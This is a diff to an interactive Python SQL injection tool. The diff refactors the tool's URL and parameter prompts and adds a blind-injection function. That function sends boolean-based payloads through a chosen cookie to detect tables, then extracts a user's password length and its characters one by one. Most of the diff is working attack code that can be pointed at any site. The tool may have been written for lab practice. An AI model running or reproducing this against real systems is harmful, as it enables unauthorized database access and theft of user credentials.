@@ -2,33 +2,46 @@ import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
-full_url = input("enter url:")
-session = requests.Session()
+
+# full_url = input("enter url:")
+# session = requests.Session()
 
 
 
-parse = urlparse(full_url)
-    # print(parsed.scheme)    https
-    # print(parsed.netloc)    example.com
-    # print(parsed.path)      /post
-    # print(parsed.query)     postId=3
+# parse = urlparse(full_url)
+#     # print(parsed.scheme)    https
+#     # print(parsed.netloc)    example.com
+#     # print(parsed.path)      /post
+#     # print(parsed.query)     postId=3
 
-# base_url = f"{parse.scheme}://{parse.netloc}"
-# path = parse.path + ("?" + parse.query if parse.query else "")
-# submit_url = base_url + path
-query_params = parse_qs(parse.query)
+# # base_url = f"{parse.scheme}://{parse.netloc}"
+# # path = parse.path + ("?" + parse.query if parse.query else "")
+# # submit_url = base_url + path
+# query_params = parse_qs(parse.query)
 
-print("\n parameters found :")
-for i, key in enumerate(query_params.keys()):
-    print(f"{i+1}, {key} = {query_params[key]}")
+# print("\n parameters found :")
+# for i, key in enumerate(query_params.keys()):
+#     print(f"{i+1}, {key} = {query_params[key]}")
 
-choice = int(input("\nselect param number:"))-1
-edit_param = list(query_params.keys())[choice]
+# choice = int(input("\nselect param number:"))-1
+# edit_param = list(query_params.keys())[choice]
 
-result_ord = {}
+# result_ord = {}
 
 def column_counter():
     col_count_test = int(input("do u want column-count testing? 1(yes) 0(no) :"))
+    full_url = input("enter url:")
+    session = requests.Session()
+    parse = urlparse(full_url)
+    query_params = parse_qs(parse.query)
+
+    print("\n parameters found :")
+    for i, key in enumerate(query_params.keys()):
+        print(f"{i+1}, {key} = {query_params[key]}")
+
+    choice = int(input("\nselect param number:"))-1
+    edit_param = list(query_params.keys())[choice]
+
     if col_count_test:
         max_c = int(input("enter the colums number:"))
         comment_style = ['--', '#']
@@ -101,6 +114,17 @@ versions = {
 
 def datatype_tester():
     dbtype_test = int(input("do u want data-type testing 1(yes) 0(no) :"))
+    full_url = input("enter url:")
+    session = requests.Session()
+    parse = urlparse(full_url)
+    query_params = parse_qs(parse.query)
+
+    print("\n parameters found :")
+    for i, key in enumerate(query_params.keys()):
+        print(f"{i+1}, {key} = {query_params[key]}")
+
+    choice = int(input("\nselect param number:"))-1
+    edit_param = list(query_params.keys())[choice]
     if dbtype_test:
         col_count = int(input("enter the number of col:"))
         quote_need = int(input("does it need quote? 1(yes) 0(no):"))
@@ -131,6 +155,17 @@ def datatype_tester():
         pass
 
 def attack():
+    full_url = input("enter url:")
+    session = requests.Session()
+    parse = urlparse(full_url)
+    query_params = parse_qs(parse.query)
+
+    print("\n parameters found :")
+    for i, key in enumerate(query_params.keys()):
+        print(f"{i+1}, {key} = {query_params[key]}")
+
+    choice = int(input("\nselect param number:"))-1
+    edit_param = list(query_params.keys())[choice]
     while True:
         self_payload = input("enter your payload:")
         test_params = query_params.copy()
@@ -147,6 +182,17 @@ def attack():
 
 
 def version():
+    full_url = input("enter url:")
+    session = requests.Session()
+    parse = urlparse(full_url)
+    query_params = parse_qs(parse.query)
+
+    print("\n parameters found :")
+    for i, key in enumerate(query_params.keys()):
+        print(f"{i+1}, {key} = {query_params[key]}")
+
+    choice = int(input("\nselect param number:"))-1
+    edit_param = list(query_params.keys())[choice]
     col_count = int(input("enter the number of col:"))
     quote_need = int(input("does it need quote? 1(yes) 0(no):"))
 
@@ -201,6 +247,17 @@ def version():
 
 
 def db_info_interactive():
+    full_url = input("enter url:")
+    session = requests.Session()
+    parse = urlparse(full_url)
+    query_params = parse_qs(parse.query)
+
+    print("\n parameters found :")
+    for i, key in enumerate(query_params.keys()):
+        print(f"{i+1}, {key} = {query_params[key]}")
+
+    choice = int(input("\nselect param number:"))-1
+    edit_param = list(query_params.keys())[choice]
     col_count = int(input(" Enter the number of columns in the query: "))
     quote_need = int(input(" Does the payload need quotes? 1(yes) / 0(no): "))
 
@@ -214,7 +271,7 @@ def db_info_interactive():
 
     if mode == "2":
         # Mode 1: List columns from a table
-        table = input(" 🔎 Enter table name (e.g. users): ").strip()
+        table = input(" Enter table name (e.g. users): ").strip()
         while True:
             try:
                 index = int(input(f" Column index (1–{col_count}) to put column_name in: "))
@@ -288,6 +345,134 @@ def db_info_interactive():
 
 
 
+
+def blind_sql():
+    url = input("enter url:")
+    session = requests.Session()
+    session.get(url)
+    cookies = session.cookies.get_dict()
+    print(cookies)
+    if not cookies:
+        print("[-] No cookie found.")
+        return
+    
+    tester = input("What is the tester word: ")
+    print("\n Available cookies:\n")
+    cookie_keys = list(cookies.keys())
+    for i,key in enumerate(cookie_keys,1):
+        print(f"{i},{key} = {cookies[key]}")
+
+    try:
+        selected = int(input("\nWhich one do u wanna change:\n"))
+        selected_key = cookie_keys[selected-1]
+    except:
+        print("[-] Invalid input.")
+        return
+    
+    original_value = cookies[selected_key] 
+    while True:
+        try:
+            choose = int(input("""Enter ur choice:
+                1 : Boolean test
+                2 : Table detector
+                3 : Object detector
+                4 : Password lenght
+                5 : Password finder
+                0 : Exit \n"""))
+            match choose:
+                case 1:
+                    payloads = ["' AND '1'='1","' AND '1'='2"]
+                    for payload in payloads:
+                        injected_value = original_value + payload
+                        test_cookies = cookies.copy()  
+                        test_cookies[selected_key] = injected_value
+                        print(f"Sending cookie: {selected_key} = {injected_value}")
+                        res = session.get(url, cookies=test_cookies)
+                        # print(f"Status code: {res.status_code}")
+                        print("True\n" if tester in res.text else "False\n")
+                case 2:
+                    table= input("Which table wanna identify:")
+                    payload =f"' AND (SELECT 'a' FROM {table} LIMIT 1)='a"
+                    injected_value = original_value + payload
+                    test_cookies = cookies.copy()
+                    test_cookies[selected_key] = injected_value
+                    print(f"Sending cookie: {selected_key} = {injected_value}")
+                    res = session.get(url, cookies=test_cookies)
+                    print(f"{table} detected!" if tester in res.text else f"can't detect {table}")
+                case 3:
+                    table = input("Table : ")
+                    column = input("which column : ")
+                    object = input("Which object : ")
+                    payload = f"' AND (SELECT 'a' FROM {table} WHERE {column}='{object}')='a"
+                    injected_value = original_value + payload
+                    test_cookies = cookies.copy()
+                    test_cookies[selected_key] = injected_value
+                    print(f"Sending cookie: {selected_key} = {injected_value}")
+                    res = session.get(url, cookies=test_cookies)
+                    print(f"{table} detected!" if tester in res.text else f"can't detect {table}")
+                case 4:
+                    
+                    table = input("Table : ")
+                    column = input("which column : ")
+                    object = input("Which object : ")
+                    pass_len = int(input("Passwprd lenght : "))
+                    for lenght in range(pass_len+1):
+                        payload = f"' AND (SELECT 'a' FROM {table} WHERE {column}='{object}' AND LENGTH(password)={lenght})='a"
+                        injected_value = original_value + payload
+                        test_cookies = cookies.copy()
+                        test_cookies[selected_key] = injected_value
+                        # print(f"Sending cookie: {selected_key} = {injected_value}")
+                        res = session.get(url, cookies=test_cookies)
+                        if tester in res.text:
+                            print(f"Password lenght is {lenght}")
+                            break
+                        else:
+                            print(f"Failed! ({lenght})")
+                        
+                case 5:
+                    chars = [
+    'a','b','c','d','e','f','g','h','i','j','k','l','m',
+    'n','o','p','q','r','s','t','u','v','w','x','y','z',
+    'A','B','C','D','E','F','G','H','I','J','K','L','M',
+    'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
+    '0','1','2','3','4','5','6','7','8','9',
+    '!','@','#','$','%','^','&','*','(',')','-','_','=','+',
+    '[',']','{','}','|',';',':',"'",'"',',','.','<','>','/','?','`','~'
+]
+                    table = input("Table : ")
+                    column = input("which column : ")
+                    object = input("Which object : ")
+                    pass_col = input("Password column name : ")
+                    pass_len = int(input("Password lenght : "))
+                    passw = []
+                    start_point = int(input("Wanna start from the beginning? 1(yes) 0(no) : "))
+                    if start_point:
+                        start_point = int(input("Where you wanna begin? : "))
+                    else:
+                        start_point = 1
+                    for i in range(start_point,pass_len+1):
+                        for c in chars:
+                            payload = f"' AND (SELECT SUBSTRING({pass_col},{i},1) FROM {table} WHERE {column}='{object}')='{c}"
+                            injected_value = original_value + payload
+                            test_cookies = cookies.copy()
+                            test_cookies[selected_key] = injected_value
+                            # print(f"Sending cookie: {selected_key} = {injected_value}")
+                            res = session.get(url, cookies=test_cookies)
+                            if tester in res.text:
+                                passw.append(c)
+                                print(f"[{i}] : {''.join(passw)}")
+                                break
+                            else:
+                                print(f"Failed! ({c})")
+                                pass
+                case 0:    
+                    break
+        except Exception as e:
+            print("ERROR:", e)
+            print("enter valid number:")
+
+
+
 while True:
     try:
         command = int(input("""enter command:
@@ -297,6 +482,7 @@ while True:
             4 : Data-type Tester
             5 : Data Base Tables Information (non Oracle)
             6 : Data Base Tables Information (Oracle : soon)
+            7 : Blind SQL
             0 : Exit
             >>>"""))
 
@@ -311,9 +497,14 @@ while True:
                 datatype_tester()
             case 5:
                 db_info_interactive()
+            case 7:
+                blind_sql()
             case 0:
                 break 
     except Exception as e:
         print("ERROR:", e)
         print("enter valid number:")
+
+
+
 
